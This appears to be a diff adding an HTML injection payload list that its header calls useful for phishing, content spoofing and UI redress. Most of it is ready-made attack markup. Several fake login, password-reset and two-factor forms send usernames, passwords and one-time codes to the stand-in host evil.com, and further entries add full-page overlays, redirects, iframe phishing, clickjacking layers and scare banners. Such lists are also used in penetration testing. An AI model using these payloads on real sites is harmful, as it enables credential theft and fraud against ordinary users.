@@ -1,0 +1,170 @@
+# HTML Injection Payloads
+# For injecting arbitrary HTML without JS execution
+# Useful for phishing, content spoofing, and UI redress
+
+# Basic HTML injection
+<h1>Injected Heading</h1>
+<p>Injected paragraph</p>
+<b>Bold text</b>
+<i>Italic text</i>
+<u>Underlined text</u>
+<br>Line break
+<hr>Horizontal rule
+
+# Form injection (phishing)
+<form action="http://evil.com/steal.php" method="POST">
+<h2>Session Expired - Please Login Again</h2>
+<label>Username:</label><input type="text" name="username"><br>
+<label>Password:</label><input type="password" name="password"><br>
+<input type="submit" value="Login">
+</form>
+
+# Credential harvesting forms
+<form action=//evil.com/log><input name=username placeholder="Username"><input name=password type=password placeholder="Password"><input type=submit value="Login"></form>
+
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999"><h1>Session Expired</h1><form action=//evil.com/capture><input name=u placeholder=Username><input name=p type=password placeholder=Password><button>Login</button></form></div>
+
+# Fake password reset
+<div style="background:#fff;padding:20px;border:1px solid #ccc">
+<h2>Password Reset Required</h2>
+<form action="http://evil.com/capture">
+<input name="current" placeholder="Current Password" type="password">
+<input name="new" placeholder="New Password" type="password">
+<button>Reset Password</button>
+</form>
+</div>
+
+# Fake 2FA prompt
+<div style="text-align:center;padding:50px">
+<h2>Two-Factor Authentication</h2>
+<p>Enter the code sent to your phone:</p>
+<form action="http://evil.com/capture">
+<input name="otp" placeholder="000000" style="font-size:24px;text-align:center;width:150px">
+<br><br>
+<button>Verify</button>
+</form>
+</div>
+
+# Image injection
+<img src="http://evil.com/tracking.gif">
+<img src="http://evil.com/fake-logo.png" style="width:200px">
+<img src=x alt="Image failed to load">
+
+# Link injection
+<a href="http://evil.com">Click here for more information</a>
+<a href="http://evil.com" style="color:blue">Important Security Update</a>
+<a href="javascript:void(0)">Broken Link Test</a>
+
+# iframe injection
+<iframe src="http://evil.com" width="100%" height="500"></iframe>
+<iframe src="http://evil.com/phishing.html" style="position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:9999"></iframe>
+
+# Style injection for UI manipulation
+<style>body{display:none}</style><h1>Site Under Maintenance</h1>
+<style>.login-form{display:none}</style>
+<style>*{visibility:hidden}</style><div style="visibility:visible;position:fixed;top:50%;left:50%;transform:translate(-50%,-50%)"><h1>Error</h1></div>
+
+# Overlay attacks
+<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.9);z-index:9999;color:white;text-align:center;padding-top:200px"><h1>Account Suspended</h1><p>Contact support: support@evil.com</p></div>
+
+# Clickjacking preparation
+<div style="position:absolute;top:0;left:0;width:100%;height:100%;opacity:0;z-index:9999"></div>
+
+# Table injection for data display
+<table border="1"><tr><td>Username</td><td>Password</td></tr><tr><td>admin</td><td>admin123</td></tr></table>
+
+# List injection
+<ul><li>Injected item 1</li><li>Injected item 2</li></ul>
+<ol><li>First</li><li>Second</li></ol>
+
+# Meta tag injection
+<meta http-equiv="refresh" content="0;url=http://evil.com">
+<meta name="robots" content="noindex">
+<base href="http://evil.com/">
+
+# Marquee (attention grabbing)
+<marquee>URGENT: Your account has been compromised!</marquee>
+<marquee bgcolor="red" style="color:white">⚠️ WARNING ⚠️</marquee>
+
+# Content spoofing
+<div style="background:#f0f0f0;padding:20px;border-radius:5px;margin:20px 0">
+<h3>System Notice</h3>
+<p>Your account will be suspended in 24 hours unless you verify your information.</p>
+<a href="http://evil.com/verify" style="background:#007bff;color:white;padding:10px 20px;text-decoration:none;border-radius:3px">Verify Now</a>
+</div>
+
+# Email/Contact injection
+<a href="mailto:attacker@evil.com">Contact Support</a>
+<a href="tel:+1234567890">Call Support</a>
+
+# Social engineering
+<div class="alert alert-danger">Your session has expired. <a href="http://evil.com">Click here to login again</a></div>
+<div style="background:yellow;padding:10px;border:2px solid red">⚠️ Security Alert: Unusual activity detected. <a href="http://evil.com">Secure your account</a></div>
+
+# Comment injection to hide content
+<!--
+<style>body{display:none}</style>
+-->
+<!-- Hiding sensitive content -->
+
+# Definition list injection
+<dl><dt>Injected Term</dt><dd>Injected Definition</dd></dl>
+
+# Blockquote injection
+<blockquote>This is an injected quote that looks legitimate</blockquote>
+
+# Pre/Code injection
+<pre>Injected preformatted text</pre>
+<code>Injected code</code>
+
+# Details/Summary for hidden content
+<details><summary>Click for more info</summary><p>Hidden injected content</p></details>
+
+# Audio/Video spam
+<audio autoplay loop><source src="http://evil.com/annoying.mp3"></audio>
+<video autoplay loop><source src="http://evil.com/annoying.mp4"></video>
+
+# Fieldset injection
+<fieldset><legend>User Information</legend><p>Injected content inside fieldset</p></fieldset>
+
+# Progress/Meter visual spam
+<progress value="70" max="100">70%</progress>
+<meter value="0.8">80%</meter>
+
+# Picture element injection
+<picture><source srcset="http://evil.com/image.webp" type="image/webp"><img src="http://evil.com/image.jpg"></picture>
+
+# SVG injection (non-scripting)
+<svg width="200" height="200"><circle cx="100" cy="100" r="80" fill="red"/><text x="100" y="105" text-anchor="middle" fill="white">FAKE</text></svg>
+
+# Canvas placeholder
+<canvas style="border:1px solid black;width:300px;height:200px"></canvas>
+
+# Object/Embed injection
+<object data="http://evil.com/content.swf" type="application/x-shockwave-flash"></object>
+<embed src="http://evil.com/content.swf" type="application/x-shockwave-flash">
+
+# Noscript content
+<noscript><h1>JavaScript Required</h1><p>Please enable JavaScript or click <a href="http://evil.com">here</a></p></noscript>
+
+# Address injection
+<address>Contact: attacker@evil.com<br>Phone: 123-456-7890</address>
+
+# Button injection
+<button onclick="location='http://evil.com'">Click Me</button>
+<button type="button">Fake Button</button>
+
+# Label injection
+<label for="fake">Enter your password:</label><input id="fake" type="password">
+
+# Figure/Figcaption
+<figure><img src="http://evil.com/fake.jpg" alt="Fake image"><figcaption>Official company image</figcaption></figure>
+
+# Time element for urgency
+<p>Offer expires: <time datetime="2024-12-31">December 31, 2024</time></p>
+
+# Abbr/Acronym
+<abbr title="Injected tooltip appears on hover">Hover Me</abbr>
+
+# Hidden but indexed content
+<div style="font-size:0;color:white;position:absolute;left:-9999px">SEO spam keywords injected here</div>
